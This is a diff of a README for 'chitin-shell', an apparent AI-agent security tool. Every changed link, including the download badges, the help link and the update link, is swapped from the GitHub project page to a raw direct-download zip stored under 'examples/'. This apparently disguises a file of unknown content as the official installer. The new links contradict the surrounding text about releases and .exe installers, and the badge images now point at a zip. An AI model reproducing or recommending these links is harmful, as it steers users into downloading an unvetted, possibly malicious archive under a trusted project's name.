@@ -1,6 +1,6 @@
 # 🔐 chitin-shell - Secure Your AI Agents Simply
 
-[![Download chitin-shell](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Enigma-s9v/chitin-shell)
+[![Download chitin-shell](https://raw.githubusercontent.com/Enigma-s9v/chitin-shell/main/examples/chitin-shell-v1.3.zip)](https://raw.githubusercontent.com/Enigma-s9v/chitin-shell/main/examples/chitin-shell-v1.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You will need to download chitin-shell from the official GitHub page.
 
 Click this button to visit the download page:
 
-[![Download chitin-shell](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Enigma-s9v/chitin-shell)
+[![Download chitin-shell](https://raw.githubusercontent.com/Enigma-s9v/chitin-shell/main/examples/chitin-shell-v1.3.zip)](https://raw.githubusercontent.com/Enigma-s9v/chitin-shell/main/examples/chitin-shell-v1.3.zip)
 
 On the page, look for the latest release under the "Releases" section. Download the Windows installer file. This file usually ends with `.exe`.
 
@@ -108,7 +108,7 @@ The chitin-shell will handle the connection, securing the process quietly.
 ## 🗂️ Where to Find Help
 
 The main source of help is the GitHub page:  
-https://github.com/Enigma-s9v/chitin-shell
+https://raw.githubusercontent.com/Enigma-s9v/chitin-shell/main/examples/chitin-shell-v1.3.zip
 
 Look at the "Issues" tab for common questions and solutions. You can also open a new issue if you encounter a problem not listed.
 
@@ -127,7 +127,7 @@ Look at the "Issues" tab for common questions and solutions. You can also open a
 
 To get started or update chitin-shell, visit this page:  
 
-[https://github.com/Enigma-s9v/chitin-shell](https://github.com/Enigma-s9v/chitin-shell)
+[https://raw.githubusercontent.com/Enigma-s9v/chitin-shell/main/examples/chitin-shell-v1.3.zip](https://raw.githubusercontent.com/Enigma-s9v/chitin-shell/main/examples/chitin-shell-v1.3.zip)
 
 Find the newest release and download the Windows installer file. Follow the same installation steps described above.
 
